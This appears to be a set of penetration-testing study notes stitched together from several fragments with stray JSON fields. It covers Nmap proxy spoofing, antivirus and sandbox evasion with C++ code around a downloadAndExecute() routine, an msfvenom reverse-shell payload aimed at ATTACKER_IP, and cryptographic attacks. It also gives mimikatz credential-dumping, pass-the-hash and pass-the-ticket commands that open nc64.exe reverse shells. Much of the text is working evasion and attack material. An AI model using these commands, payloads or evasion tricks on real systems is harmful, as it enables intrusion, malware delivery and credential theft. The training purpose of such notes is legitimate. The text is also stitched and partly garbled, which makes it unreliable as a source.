For example, --ip-options \"L 10.10.10.50 10.10.50.250\" requests that scan packets are routed through the two provided IP addresses. Strict routing can be specified using S . Strict routing requires setting every hop between the originating system and the target host. For example, --ip-options \"S 10.10.10.1 10.10.20.2 10.10.30.3\" specifies that the packets go via these three hops before reaching the target host. Using proxy servers  The use of proxy servers can help hide the source machine. Nmap offers the option --proxies that takes a comma-separated list of proxy URLs. Each URL must be expressed in the format proto://host:port . Valid protocols are HTTP and SOCKS4 . Authentication is not currently supported. As an example, instead of running nmap -sS MACHINE_IP , edit the Nmap command to something like: nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 MACHINE_IP This way, the scan goes through HTTP proxy host1, then SOCKS4 proxy host2, before reaching the target. Using a browser to connect to the target, it would be simple to pass the traffic via a proxy server. Other network tools provide their own proxy settings that can be used to hide the traffic source.

Packers do this with two main goals in mind: Compress the program so that it takes up less space. Protect the program from reverse engineering in general. Packers can also obfuscate malware without much effort. There are quite a large number of packers, including UPX, MPRESS, Themida, and many others. If an AV is catching a reverse shell executable as malicious because it matches a known signature, using a packer will transform the reverse shell executable so that it does not match any known signatures while on disk. As a result, you should be able to distribute your payload to any machine’s disk without much problem. Some AV solutions could still catch the packed application: While the original code might be transformed into something unrecognisable,the packed executable contains a stub with the unpacker’s code. If the unpacker has a known signature, AV solutions might still flag any packed executable based on the unpacker stub alone. At some point, the application will unpack the original code into memory so that it can be executed. If the AV solution can do in-memory scans, it might still be detected after the code is unpacked.

Edit the “true” rule and set it to the Maximum preset. Go to the “Protect!” tab and click “Protect”. set up an nc listener on the attack machine. Execute the payload. Works! But … when running a command on the reverse shell, the AV notices it and kills it. Windows Defender will hook certain Windows API calls and do in-memory scanning whenever such API calls are used. In the case of any shell generated with msfvenom, CreateProcess() will be invoked and detected. Now what?  Just wait a bit. Try spawning the reverse shell again and wait for around 5 minutes before sending any command. You’ll see the AV won’t complain anymore. The reason for this is that scanning memory is an expensive operation. Therefore, the AV will do it for a while after your process starts but will eventually stop. Use smaller payloads. The smaller the payload, the less likely it is to be detected. If you use msfvenom to get a single command executed instead of a reverse shell, the AV will have a harder time detecting it.

    "c": "Implementing evasion techniques  Taking a Nap  Take the template code from Common sandbox evasion techniques and add a Sleep statement for 120,000ms to it. This translates to roughly 120 seconds or 2 minutes. Generally, you would want a time closer to 5 minutes to be sure; but 2 minutes will suffice for testing purposes: int main() { Sleep(120000); downloadAndExecute(); return 0; } Compile and upload the code to Any.Run : Sleep Bypass No Sleep Bypass A simple technique, incredibly powerful and has allowed us to run out Any.Run’s one-minute timer. This method may or may not work due to various blog posts that have been published showing how Blue Teamers can create sleep timer bypasses. A better implementation could be to waste computing time by doing heavy math. Geolocation Filtering  Leveraging Geolocation blocks. Fortunately, there is a good amount of code that is already written for us. Portions of the downloadAndExecute() function can be re-used for this: Website URL (formerly the c2URL variable) Internet Stream (formerly the stream variable) String variable (formerly the s variable) Buffer Space (formerly the Buff variable) Bytes Read (formerly the unsigned long bytesRead variable) Lastly, the URLOpenBlockingStreamA function BOOL checkIP() { // Declare the Website URL that we would like to vicit const char* websiteURL = \"<https://ifconfig.me/ip>\"; // Create an Internet Stream to access the website IStream* stream; // Create a string variable where we will store the string data received from the website string s; // Create a space in memory where we will store our IP Address char buff[35]; unsigned long bytesRead; // Open an Internet stream to the remote website URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0); // While data is being sent from the webserver, write it to memory while (true) { stream->Read(buff, 35, &bytesRead); if (0U == bytesRead) { break; } s.append(buff, bytesRead); } // Compare if the string is equal to the targeted victim's IP. If true, return the check is successful. Else, fail the check. if (s == \"VICTIM_IP\") { return TRUE; } else { return FALSE; } } Modify main : int main(){ if(checkIP() == TRUE){ downloadAndExecute(); return 0; } else { cout << \"HTTP/418 - I'm a Teapot!\"; return 0; } } Compile and upload the code to Any.Run : with an IP Address Filter without an IP Address Filter ifconfig.me is flagged as a questionable/Potentially Malicious site used to check for your external IP Address. This Sandbox evasion method ended up hurting our score, so it should be used as a last resort or with a recently deployed/custom IP Address checking server. Checking system information  Start off the System Information category with - the amount of RAM a system has. It is important to note that Windows measures data in a non-standard format. If you have ever bought a computer that said it has “256GB of SSD Storage”, after turning it on, you would have closer to 240GB. This is because Windows measures data in units of 1024-bytes instead of 1000-bytes. This can get confusing very quickly. Fortunately for us, we will be working in such small amounts of memory that accuracy can be a best guess instead of an exact number. Now that we know this, how can we determine how much memory is installed on the System? We only need the Windows header file included, and we can call a specific Windows API, GlobalMemoryStatusEx , to retrieve the data: Declare the MEMORYSTATUSEX struct Set the size of the dwLength member to the size of the struct Call the GlobalMemoryStatusEx Windows API to populate the struct with the memory information We want the total amount of physical memory installed on the system, so we will print out the ullTotalPhys member of the MEMORYSTATUSEX struct to get the size of the memory installed in the system in Bytes. Divide by 1024 3x to get the value of memory installed in GiB. In C++: #include <iostream> #include <Windows.h> using namespace std; int main() { // Declare the MEMORYSTATUSEX Struct MEMORYSTATUSEX statex; // Set the length of the struct to the size of the struct statex.dwLength = sizeof(statex); // Invoke the GlobalMemoryStatusEx Windows API to get the current memory info GlobalMemoryStatusEx(&statex); // Print the physical memory installed on the system cout << \"There is \" << statex.ullTotalPhys/1024/1024/1024 << \"GiB of memory on the system.\"; } Most Sandboxes have 4GB of RAM dedicated to the machine, so we should check and see if the memory count is greater than 5; if it is not, exit the program; if it is, continue execution. BOOL memoryCheck() { // This function will check and see if the system has 5+GB of RAM // Declare the MEMORYSTATUSEX Struct MEMORYSTATUSEX statex; // Set the length of the struct to the size of the struct statex.dwLength = sizeof(statex); // Invoke the GlobalMemoryStatusEx Windows API to get the current memory info GlobalMemoryStatusEx(&statex); // Checks if the System Memory is greater than 5.00GB if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) { return TRUE; } else { return FALSE; } } int main() { // Evaluates if the installed RAM amount is greater than 5.00 GB, //if true download Shellcode, if false, exit the program. if (memoryCheck() == TRUE) { downloadAndExecute(); } else { exit; } return 0; } Compile and upload the code to Any.Run : with the Memory Check function without the Memory Check function In the first submission, our memory check function works without any issue and gracefully exits the program when it notices the device has less than 5GB of RAM. The code functions as intended. Querying Network Information  Querying information about the Active Directory domain can be kept simple by querying the name of a Domain Controller using the NetGetDCName Windows API. BOOL isDomainController(){ // Create a long pointer to Wide String for our DC Name to live in LPCWSTR dcName; // Query the NetGetDCName Win32 API for the Domain Controller Name NetGetDCName(NULL, NULL, (LPBYTE *) &dcName); // Convert the DCName from a Wide String to a String wstring ws(dcName); string dcNewName(ws.begin(), ws.end()); // Search if the UNC path is referenced in the dcNewName variable. If so, there is likely a Domain Controller present in the environment. If this is true, pass the check, else, fail. if ( dcNewName.find(\"\\\\\\\\\"){ return TRUE; } else { return FALSE; } } int main() { if (isDomainController == TRUE) { downloadAndExecute(); } else { cout << \"Domain Controller Not Found!\"; } } Compile and upload to VirusTotal: Looking at the results of the SysInternals Sandbox, we can see that the Sandbox evasion technique worked.

    "c": "Static code-based signatures  The Layered Obfuscation Taxonomy covers the most reliable solutions as part of the Obfuscating Methods and Obfuscating Classes layer. The techniques class splitting/coalescing and method scattering/aggregation can be grouped into an overarching concept of splitting or merging any given OOP (Object-Oriented Programming) function. Other techniques such as dropping modifiers or method clone can be grouped into an overarching concept of removing or obscuring identifiable information. Splitting and merging objects  The methodology required to split or merge objects is very similar to the objective of concatenation: Create a new object function that can break the signature while maintaining the previous functionality. As an example, in Using Custom Covenant Listener Profiles & Grunt Templates to Elude AV a string is replaced with a call to a new object (class) splitting the message. The original offending string: string MessageFormat = @\"{{\"\"GUID\"\":\"\"{0}\"\",\"\"Type\"\":{1},\"\"Meta\"\":\"\"{2},\"\"IV\"\":\"\"{3}\"\",\"\"EncryptedMessage\"\":\"\"{4}\"\",\"\"HMAC\"\":\"\"{5}\"\"}}\"; Obfuscated Method: The new class used to replace and concatenate the string. public static string GetMessageFormat // Format the public method { get // Return the property value { var sb = new StringBuilder(@\"{{\"\"GUID\"\":\"\"{0}\"\",\"); // Start the built-in concatenation method sb.Append(@\"\"\"Type\"\":{1},\"); // Append substrings onto the string sb.Append(@\"\"\"Meta\"\":\"\"{2}\"\",\"); sb.Append(@\"\"\"IV\"\":\"\"{3}\"\",\"); sb.Append(@\"\"\"EncryptedMessage\"\":\"\"{4}\"\",\"); sb.Append(@\"\"\"HMAC\"\":\"\"{5}\"\"}}\"); return sb.ToString(); // Return the concatenated string to the class } } string MessageFormat = GetMessageFormat Removing and obscuring identifiable information  Applying removing identifiable information to identified signatures in any objects including methods and classes. An example of this can be found in Mimikatz where an alert is generated for the string wdigest.dl l. This can be solved by replacing the string with any random identifier changed throughout all instances of the string.

    "c": "Encoding and encrypting shellcode  Tools such as Metasploit provide encoding and encryption features. However, AV vendors are aware of the way these tools build their payloads and take measures to detect them. If you try using such features out of the box, chances are your payload will be detected as soon as the file touches the victim’s disk.

Try encrypting the payload. Intuitively, we would expect this to have a higher success rating, as decrypting the payload should prove a harder task for the AV. Metasploit encryption  Listing encryption modules within the Metasploit framework: $ msfvenom --list encrypt Xoring shellcode using the Metasploit framework: $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key \"MyZekr3tKey***\" -o xored-revshell.exe It still gets flagged by the AV. Creating a Custom Payload  The best way to overcome this is to use a custom encoding schemes so that the AV doesn’t know what to do to analyse the payload.

Staged payloads work by using intermediary shellcodes that act as steps leading to the execution of a final shellcode. Each of these intermediary shellcodes is known as a stager, and its primary goal is to provide a means to retrieve the final shellcode and execute it eventually. There are payloads with several stages, but the usual case involves having a two-stage payload where the first stage, stage0 , is a stub shellcode that will connect back to the attacker’s machine to download the final shellcode to be executed. Once retrieved, the stage0 stub will inject the final shellcode somewhere in the memory of the payload’s process and execute it. Advantages of stageless payloads: The resulting executable packs all that is needed to get our shellcode working. The payload will execute without requiring additional network connections. The fewer the network interactions, the lesser your chances of being detected by an IPS. If you are attacking a host with very restricted network connectivity, you may want your whole payload to be in a single package. Advantages of staged payloads: Small footprint on disk. Since stage0 is only in charge of downloading the final shellcode, it will most likely be small in size. The final shellcode isn’t embedded into the executable. If your payload is captured, the Blue Team will only have access to the stage0 stub and nothing more. The final shellcode is loaded in memory and never touches the disk. This makes it less prone to be detected by AV solutions. You can reuse the same stage0 dropper for many shellcodes, as you can simply replace the final shellcode that gets served to the victim machine.",

    "t": "Down streams ",
    "c": "Down streams  Stream ciphers are deterministic. This allows for decrypting by regenerating the pseudorandom bits used to encrypt. Stream ciphers take two values: a key and a nonce. The key should be secret and is usually 128 or 256 bits. The nonce does not have to be secret, but should be unique for each key and is usually between 64 and 128 bits. The nonce is sometimes called the IV, for initial value. Stateful stream ciphers have a secret internal state that evolves throughout keystream generation. The cipher initialises the state from the key and the nonce and then calls an update function to update the state value and produce one or more keystream bits from the state. Counter-based stream ciphers produce chunks of keystream from a key, a nonce, and a counter value. No secret state is memorised during keystream generation. Linear Feedback Shift Registers  Linear feedback shift registers (LFSRs) are FSRs with a linear feedback function, a function that is the XOR of some bits of the state. Thanks to this linearity, LFSRs can be analyzed using notions like linear complexity, finite fields, and primitive polynomials. The choice which bits are XORed together is essential for the period of the LFSR and thus for its cryptographic value. The position of the bits must be selected such to guarantee a maximal period ( \\(2^n – 1\\) ). The maximal period of an n-bit LFSR is \\(2^n – 1\\) , not \\(2^n\\) , because the all-zero state always loops on itself infinitely. Take the indices of the bits, from 1 for the rightmost to n for the leftmost, and write the polynomial expression \\(1 + X + X^2 + . . . + X^n\\) , where the term \\(X^i\\) is only included if the \\(i\\) th bit is one of the bits XORed in the feedback function. The period is maximal if and only if that polynomial is primitive. To be primitive, the polynomial must be irreducible, meaning that it ca not be factorised (written as a product of smaller polynomials). Using an LFSR as a stream cipher is insecure. If \\(n\\) is the LFSR’s bit length, an attacker needs only \\(n\\) output bits to recover the LFSR’s initial state, allowing them to determine all previous bits and predict all future bits. This attack is possible because the Berlekamp–Massey algorithm can be used to solve the equations defined by the LFSR’s mathematical structure to find not only the LFSR’s initial state but also its feedback polynomial. It isn’t even needed to know the exact length of the LFSR; repeat the Berlekamp–Massey algorithm for all possible values of \\(n\\) until you hit the right one. RootMe challenges  LFSR - Known plaintext Security  Many things can go wrong with stream ciphers, from brittle, insecure designs to strong algorithms incorrectly implemented. The most common failure seen with stream ciphers occurs when a nonce is reused more than once with the same key. This produces identical keystreams, allowing an adversary to break the encryption by XORing two ciphertexts together.

To solve this challenge you have access to an encryption oracle and may inject a single fault during the encryption of a chosen plaintext, repeatedly.

    "c": "AES busting  AES is a symmetric key, block cipher algorithm. It is used in many common Internet protocols and operating system services, including TLS, IPSec, and file-level or full-disk encryption. Given its ubiquity, it is an important cipher to know how to use, and the principles of (in)correct use of AES transfer easily to (in)correct use of other ciphers. Even though AES is a block cipher, it (like many other block ciphers) can be used in a way that makes it behave like a stream cipher. AES processes blocks of 128 bits using a secret key of 128, 192, or 256 bits, with the 128-bit key being the most common because it makes encryption slightly faster and because the difference between 128- and 256-bit security is meaningless for most applications. AES modes  Mode Notes Electronic Code Book (AES-ECB) Each 16-byte block of plaintext is encrypted independently. Cipher Block Chaining (AES-CBC) Each plaintext block gets XOR-ed with the previous ciphertext block prior to encryption. An initialization vector is used to make sure each encryption has a different ciphertext result. Cipher FeedBack (AES-CFB) The keystream is obtained by encrypting the last ciphertext produced with the block cipher. Output FeedBack (AES-OFB) The keystream is obtained by recursively encrypting the Initialization Vector. Counter (AES-CTR) The keystream is generated by encrypting a sequence of counter blocks with ECB. Galois Counter Mode (AES-GCM) A combination of Counter mode (CTR) and Authentication. Uses a Message Authentication Code (MAC) for authentication. Encrypt-then-authenticate- then-translate (AEX) Another method for Authenticated Encryption with AES. Pros and cons  TL;DR: Use GCM mode for maximum security. Name Pros Cons ECB Simplest. Weakest cipher Padding needed. CBC Each ciphertext is different => It is not possible to know if two hashed data strings originate from the same plaintext. Padding needed. An error in one plain text block will affect all the following blocks. Vulnerable to attacks like padding oracle attacks, chosen-plaintext attacks, and chosen-ciphertext attacks if the initialization vector isn’t changed for every encryption. The previous block must be known to encrypt the next block => No parallelisation of operations => Slow. CFB A stream cipher accepts data of any length => padding not needed. Each ciphertext relies on the other to be decrypted => Corrupted data cannot be recovered. No parallelisation of operations. => Slow. OFB A stream cipher accepts data of any length => padding not needed. The correct IV is needed to decrypt the whole thing => Corrupted data cannot be recovered. No parallelisation of operations => Slow. CTR A stream cipher accepts data of any length => padding not needed. Each counter block can be encrypted separately =>Parallelisation possible => Faster. Corrupted data cannot be recovered. Needs a different IV for each message to be truly secure. GCM Guarantees integrity. Pipelines and parallelisation of operations possible. Minimal computational footprint. Complex implementation. AEX Detects unauthorised modifications. Simpler than GCM to implement. Slower than GCM. ECB  The most basic encryption mode is the electronic codebook (ECB) mode. The message is divided into blocks and each block is encrypted separately. The problem is that if you submit the same plain text more than once, you always get the same ciphertext. This gives attackers a place to begin analysing the cipher to attempt to derive the key. ECB is using the cipher exactly as it is described without improving its security. There is no good reason to use ECB over CBC, if both ends of the communication can support CBC. Cipher block chaining is a strong deterrent to known plain text attacks. CBC  When using cipher block chaining (CBC) mode , each block of plaintext is XOR’d with the previous ciphertext block before being encrypted. This means there is more randomness in the final ciphertext. This is much more secure than electronic codebook mode and is the most common mode. The only issue with CBC is the first block. There is no preceding block of ciphertext to XOR the first plaintext block with. It is common to add an initialization vector (IV) to the first block so that it has something to be XOR’d with. The initialization vector is a pseudorandom number, much like the cipher key. Usually, an IV is only used once, a \\(nonce\\) (Number Only used Once). The decryption process in CBC mode is done as: (1)  \\[\\begin{align} P_1 =& Dec_k(C_1) \\oplus IV\\\\ P_i =& Dec_k(C_i) \\oplus C_{i-1},\\;\\; 1 < i \\leq nb, \\end{align}\\] where \\(nb\\) is the number of blocks. Bit-flipping attack  If you know the position of the target byte, then you can modify the corresponding ciphertext position in the previous ciphertext block. For example, if you modify a byte in the ciphertext \\(C_{i-1}\\) , then \\(P_i\\) will be changed by one block since \\(C_{i-1}\\) only affects the plaintext \\(P_i\\) by \\(\\oplus\\) . A ciphertext byte of \\(C_2\\) is modified: This affects the corresponding byte in the next plaintext block \\(P_3\\) and in the corresponding full plaintext block \\(P_2\\) which has the same index as the modified ciphertext which is garbage. There is an error. An \\(\\text{IV}\\) byte is modified: This affects only the corresponding byte in the first plaintext \\(P_1\\) . If the target plaintext is in the first block, this will not leave a trace. Padding oracle attack  A padding oracle is a system that behaves differently depending on whether the padding in a CBC-encrypted ciphertext is valid. You can see it as a black box or an API that returns either a success or an error value. A padding oracle can be found in a service on a remote host sending error messages when it receives malformed ciphertexts. The preferred method of padding block ciphertexts is PKCS7. In PKSC7, the value of each padded byte is the same as the number of bytes being added. Given a padding oracle, padding oracle attacks record which inputs have a valid padding and which do not, and exploit this information to decrypt chosen ciphertext values. Assume having intercepted a CBC encrypted ciphertext, and being able to connect with a server to pass in any ciphertext, and the server will tell us whether it decrypts to plaintext with valid padding or not. The server is used as oracle. In CBC decryption, each ciphertext is passed through the cipher, then XORed with the previous ciphertext block to give the plaintext. The attack works by calculating the “intermediate state” of the decryption for each ciphertext. This is the state of a ciphertext block after being decrypted by the block cipher but before being XORed with the previous ciphertext block. \\(C_1\\) is known already, as it is just part of the intercepted ciphertext, so if we find \\(I_2\\) then we can trivially find \\(P_2\\) and decrypt the ciphertext. Pick a random block \\(C_1\\) and vary its last byte until the padding oracle accepts the ciphertext as valid. Usually, in a valid ciphertext, \\(C_1[15] ⊕ X[15]\\) = 01, so you’ll find \\(X[15]\\) after trying around 128 values of \\(C1[15]\\) . Find the value \\(X[14]\\) by setting \\(C_1[15]\\) to \\(X[15] ⊕ 02\\) and searching for the \\(C_1[14]\\) that gives correct padding. When the oracle accepts the ciphertext as valid, it means you have found \\(C_1[14]\\) such that \\(C_1[14] ⊕ X[14] = 02\\) . Repeat steps 1 and 2 for all 16 bytes. In the wilderness (real digital world), implementing a padding oracle attack is a bit more complicated than that, because one has to deal with wrong guesses at step 1 . A ciphertext may have valid padding not because \\(P_2\\) ends with a single 01 but because it ends with two 02 bytes or three 03 bytes. But that’s easily managed by testing the validity of ciphertexts where more bytes are modified. CTR  In CTR mode, encryption XORs the plaintext and the stream taken from “encrypting” the nonce, N , and counter, Ctr . Decryption is the same, so you only need the encryption algorithm for both encryption and...",

    "t": "Security goals ",
    "c": "Security goals  A cipher is secure if, even given a large number of plaintext–ciphertext pairs, nothing can be learned about the cipher’s behavior when applied to other plaintexts or ciphertexts. What can be “learned” and what is a “cipher’s behaviour”? Security goals are descriptions of what is considered a successful attack. Cryptographers define two main security goals that correspond to different ideas of what it means to learn something about a cipher’s behaviour. Indistinguishability (IND)  Ciphertexts should be indistinguishable from random strings. This is usually illustrated with a hypothetical game: if an attacker picks two plaintexts and then receives a ciphertext of one of the two (chosen at random), they shouldn’t be able to tell which plaintext was encrypted, even by performing encryption queries with the two plaintexts (and decryption queries, if the model is CCA rather than CPA). Non-malleability (NM)  Given a ciphertext \\(C_1 = E(K, P_1)\\) , it should be impossible to create another ciphertext, \\(C_2\\) , whose corresponding plaintext, \\(P_2\\) , is related to \\(P_1\\) in a meaningful way (for example, to create a \\(P_2\\) that is equal to \\(P_1 ⊕ 1\\) or to \\(P_1 ⊕ X\\) for some known value \\(X\\) ). Surprisingly, the one-time pad is malleable: given a ciphertext \\(C1 = P 1 ⊕ K\\) , you can define \\(C_2 = C_1 ⊕ 1\\) , which is a valid ciphertext of \\(P_2 = P_1 ⊕ 1\\) under the same key \\(K\\) . Oops. Security goals are only useful when combined with an attack model. The convention is to write a security notion as GOAL-MODEL. For example, IND-CPA denotes indistinguishability against chosen-plaintext attackers, NM-CCA denotes nonmalleability against chosen-ciphertext attackers, and so on. Semantic security (IND-CPA)  The Semantic security notion captures the intuition that ciphertexts should not leak any information about plaintexts as long as the key is secret. To achieve IND-CPA security, encryption must return different ciphertexts if called twice on the same plaintext; otherwise, an attacker could identify duplicate plaintexts from their ciphertexts, contradicting the definition that ciphertexts shouldn’t reveal any information. One way to achieve IND-CPA security is to use randomised encryption: With randomised encryption, ciphertexts must be slightly longer than plaintexts in order to allow for more than one possible ciphertext per plaintext. For example, if there are \\(2^{64}\\) possible ciphertexts per plaintext, ciphertexts must be at least 64 bits longer than plaintexts. One of the simplest constructions of a semantically secure cipher uses a deterministic random bit generator (DRBG), an algorithm that returns randomlooking bits given some secret value: (1)  \\[\\begin{align} E(K,R,P) = ( DRBG ( K || R ) \\oplus P , R ) \\end{align}\\] Here, \\(R\\) is a string randomly chosen for each new encryption and given to a DRBG along with the key ( \\(K || R\\) denotes the string consisting of \\(K\\) followed by \\(R\\) ). This approach is reminiscent of the one-time pad: instead of picking a random key of the same length as the message, we leverage a random bit generator to get a random-looking string. The proof that this cipher is IND-CPA secure is simple, if we assume that the DRBG produces random bits. The proof works ad absurdum: if you can distinguish ciphertexts from random strings, which means that you can distinguish \\(DRBG(K || R) ⊕ P\\) from random, then this means that you can distinguish \\(DRBG(K || R)\\) from random. The CPA model lets you get ciphertexts for chosen values of \\(P\\) , so you can XOR \\(P\\) to \\(DRBG(K, R) ⊕ P\\) and get \\(DRBG(K, R)\\) . This is a contradiction, because we started by assuming that \\(DRBG(K, R)\\) can not be distinguished from random, producing random strings. The conclusion therefore is that ciphertexts can not be distinguished from random strings, and therefore that the cipher is secure. Asymmetric encryption  The attack models and security goals for asymmetric encryption are about the same as for symmetric encryption, except that because the encryption key is public, any attacker can make encryption queries by using the public key to encrypt. The default model for asymmetric encryption is therefore the chosen-plaintext attacker (CPA). Symmetric and asymmetric encryption are the two main types of encryption, and they are usually combined to build secure communication systems. They’re also used to form the basis of more sophisticated schemes.

Get the flag by faking a signature. Retrieve the necessary files using SSH then validate the challenge by sending your signed message to the provided network service. Elliptic curve digital signature algorithm  ECDSA, an elliptic curve variant of DSA that was invented only to circumvent patents in Schnorr signatures. The signature scheme is specified in many standards including ISO 14888-3, ANSI X9.62, NIST’s FIPS 186-2, IEEE P1363, and so on. Not all standards are compatible, and applications that want to interoperate have to make sure that they use the same standard. As with all such schemes, the public key is pretty much always generated according to the same formula: The private key is a large number x generated randomly. The public key is obtained by viewing \\(x\\) as an index in a group created by a generator (called base point in elliptic curve cryptography). To compute an ECDSA signature, you need the same inputs required by a Schnorr signature: a hash of the message you’re signing \\((H(m))\\) , your private key \\(x\\) , and a random number \\(k\\) that is unique per signature. \\(k\\) must never be repeated nor be predictable! Without that, it is trivial to recover the private key. Even more subtle, if the nonce \\(k\\) is not picked uniformly and at random (specifically, if you can predict the first few bits), there still exist powerful attacks that can recover the private key in no time (so-called lattice attacks). In theory, these kinds of key retrieval attacks are called total breaks (because they break everything!). They are quite rare in practice, which makes ECDSA an algorithm that can fail in spectacular ways.

    "c": "Use of alternate authentication material  NTLM authentication flow  This is for domain authentication. In local authentication, this process only occurs between the client and server, as the server keeps the user's NTLM hash in the SAM If an attacker manages to compromise a machine where a domain user is logged in, the attacker may be able to dump the domain user’s NTLM hash from memory by using a tool like mimikatz or other methods. The attacker could try to crack the hash(es) and user passwords. User sends hash (not password). This allows an attacker to authenticate as a user in certain situations without ever needing to know a password, called pass-the-hash . It does require dumping hashes locally or remotely. Kerberos authentication flow  Ticket Granting Ticket: As long as the session has not lapsed, the user can reuse the TGT as often as needed to request a TGS. Ticket Granting Service: The TGS also has a service session key, and when the SP decrypts the ticket, the SP will have a session key for the user. User Authentication: Deny/Allow Pass-the-Ticket requires both the ticket and the service session key in order to pass a TGS to a service principal to authenticate as a user. A TGT (Golden ticket) allows an attacker to request multiple TGSs (Silver tickets) on behalf of a user. When a user requests a TGS, they send an encrypted timestamp derived from their password. The algorithm used to create this key can be DES (disabled by default on newer Windows installations), RC4 , AES218 , or AES256 , and can perhaps be extracted using mimikatz . If any of these keys are available on the host, then we can try to request a TGT as the user the Pass-the-Key way. The RC4 hash is equal to a user’s NTLM hash. If a users’ NTLM hashes were dumped from LSASS during enumeration on a domain-joined host, and RC4 a valid encryption algorithm, then these are RC4 hashes, which could be used to request a TGT the Overpass-the-Hash way. Cracking hashes  As a result of extracting credentials from a host where we have attained administrative privileges, we might get clear-text passwords, or hashes that can be easily cracked. NTLM hash (NTHash)  These hashes can be obtained by dumping the SAM database or using mimikatz . They are also stored on domain controllers in the NTDS file. These are the hashes that can be used to pass-the-hash . Usually people call this the NTLM hash (or just NTLM), which is misleading, as Microsoft refers to this as the NTHash (at least in some places). Example: B4B9B02E6F09A9BD760F388B67351E2B The algorithm: MD4(UTF-16-LE(password)) UTF-16-LE is the little endian UTF-16 . Windows used this instead of the standard big endian. Cracking: john --format=nt hash.txt hashcat -m 1000 -a 3 hash.txt NTLMv1 (Net-NTLMv1) hash  The NTLM protocol uses the NTHash in a challenge/response between a server and a client. The v1 of the protocol uses both the NT and LM hash, depending on configuration and on what is available. A way of obtaining a response to crack from a client, responder can be used. The value to crack would be the K1 | K2 | K3 . Version 1 is deprecated, but might still be used in some old systems on the network. Example u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c The algorithm: C = 8-byte server challenge, random K1 | K2 | K3 = LM/NT-hash | 5-bytes-0 response = DES(K1,C) | DES(K2,C) | DES(K3,C) Cracking: john --format=netntlm hash.txt hashcat -m 5500 -a 3 hash.txt NTLMv2 (Net-NTLMv2) hash  The new and improved version of the NTLM protocol, which makes it a bit harder to crack. The concept is the same as NTLMv1, but a different algorithm and responses are sent to the server. Can also be captured with responder . This is the Default in Windows since Windows 2000. Example: admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 The algorithm: SC = 8-byte server challenge, random CC = 8-byte client challenge, random CC* = (X, time, CC2, domain name) v2-Hash = HMAC-MD5(NT-Hash, user name, domain name) LMv2 = HMAC-MD5(v2-Hash, SC, CC) NTv2 = HMAC-MD5(v2-Hash, SC, CC*) response = LMv2 | CC | NTv2 | CC* Cracking: john --format=netntlmv2 hash.txt hashcat -m 5600 -a 3 hash.txt Pass-the-hash  The NTLM challenge sent during authentication can be responded to just by knowing the password hash. Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can pass-the-hash (PtH) for authentication. Assuming NTLMv2, To extract NTLM hashes, use mimikatz to read the local SAM or extract hashes directly from LSASS memory. Extracting NTLM hashes from local SAM will only allow getting hashes from local users on the machine. No domain user hashes will be available. mimikatz # privilege::debug mimikatz # token::elevate mimikatz # lsadump::sam Extracting NTLM hashes from LSASS memory will give any NTLM hashes for local users and any domain user that has recently logged onto the machine. mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::msv The extracted hashes can be used in a PtH attack by using mimikatz to inject an access token for the target user on a reverse shell (or any other command): mimikatz # token::revert mimikatz # sekurlsa::pth /user:<username> /domain:<domainname> /ntlm:6b4a57f67805a663c818106dc0648484 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5555\" token::revert reestablishes the original token privileges, because trying to pass-the-hash with an elevated token will not work. Run a reverse listener on the attack machine: nc -lnvp 5555 Running the whoami command on this shell, it will still show the original user from before doing the PtH, but any command run from here will use the credentials thet were injected. Some Linux tools have built-in support for PtH attacks using different protocols. Depending on which services are available, try: Connect to RDP using PtH: xfreerdp /v:<IP target> /u:<domainname>\\\\<username> /pth:<ntlmhash> Connect via psexec using PtH: psexec.py -hashes <ntlmhash> <domainname>/<username>@<IP target> Note: Only the linux version of psexec supports PtH. Connect to WinRM using PtH: evil-winrm -i <IP target> -u <username> -H <ntlmhash> Pass-the-ticket  It may be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz . This usually requires having SYSTEM privileges on the attacked machine: mimikatz # privilege::debug mimikatz # sekurlsa::tickets /export Extracting TGTs will require administrator privileges, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account). We need the ticket and its corresponding session key. Inject the ticket into the current session: mimikatz # kerberos::ptt <ticket> Where ticket looks something like: [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi Injecting tickets in our own session does not require administrator privileges. After this, the tickets will be available for any tools used for lateral movement. To check if the tickets were correctly injected, exit out of the mimikatz session and: za\\user.name@THMJMP2 C:\\> klist Overpass-the-hash/Pass-the-key  This attack is similar to PtH but then for Kerberos networks. Obtain the Kerberos encryption keys from memory with mimikatz: mimikatz # privilege::debug mimikatz # sekurlsa::ekeys Get a reverse shell. Depending on the available keys: RC4: mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5556\" AES128 hash: mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5556\" If we have the AES256 hash: mimikatz # sekurlsa::pth /user:Administrator...",

